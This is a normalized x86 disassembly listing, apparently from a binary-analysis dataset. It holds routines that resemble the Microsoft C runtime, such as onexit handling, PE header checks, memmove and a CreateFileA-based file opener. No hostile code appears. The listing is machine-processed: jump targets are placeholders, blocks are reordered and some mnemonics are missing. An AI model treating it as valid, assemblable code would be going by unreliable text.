xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_200b444
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_2004f49
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_200b478
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_2008528
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_2008528
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_200e23b
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_20084ad
mov [ esi ] eax
add esi 0x4
push esi
call sub_20084ad
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_200baaf
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_200baaf
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_20084ad
pop ecx
mov [ rw-data ] eax
sub_200b534
push esi
push 0x4
push 0x20
call sub_200ba63
mov esi eax
push esi
call sub_20084ad
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_200b563
push 0xc
push r--data
call sub_2006310
call sub_200523d
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_200b478
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b599
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
sub_200b5b6
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_20084ad
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_200b5e0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_200b620
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_200b670
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_2006370
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_200b5e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_200b620
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_200b795
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_200b7d9
push 0x20
push r--data
call sub_2006310
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_20086fb
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_2006355
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_200b795
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_2005457
mov [ ebp - 0x1c ] 0x1
push eax
call sub_2008528
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_2005621
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_2006be9
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_2005816
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_200851f
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200b94d
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_200b9b6
push 0x10
push r--data
call sub_2006310
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
sub_200ba1e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_20046f8
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_200ba63
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200e3fe
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_200baaf
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2004938
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_200bb00
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_200bb88 ]
jmp [ ecx * 4 + jump_table_200bc08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200bc74 ]
pop esi
pop edi
pop ebp
jmp sub_20079c2
jmp [ ecx * 4 + jump_table_200be10 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_200bd14 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200be10 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_200bc74 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_200be10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200bc74 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200bc74 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_200bc74 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200be10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200be10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_200be10 ]
sub_200be65
push 0x10
push r--data
call sub_2006310
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_2005816
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200befb
mov eax [ ebp - 0x1c ]
call sub_2006355
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_2003e54
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_200368f
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_200bf04
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2006ac1
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_200e78e
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_2005634
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_2005621
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_2006be9
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_200cdf7
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_2005634
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_2005621
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_2005621
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_2005647
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_2005647
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_2005621
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_200cbb2
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_200a10c
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_2007033
add esp 0xc
test eax eax
jne r-xdata
call sub_2005634
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_200a10c
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_20077a1
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_2005647
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_200cc33
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_200e51c
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_2007033
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_200ca14
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_200ca14
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_20077a1
pop ecx
call sub_2005621
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_200a10c
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_200b010
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_200a10c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_200ca14
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_200ca14
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_200c623
push 0x14
push r--data
call sub_2006310
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_2005621
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_2006be9
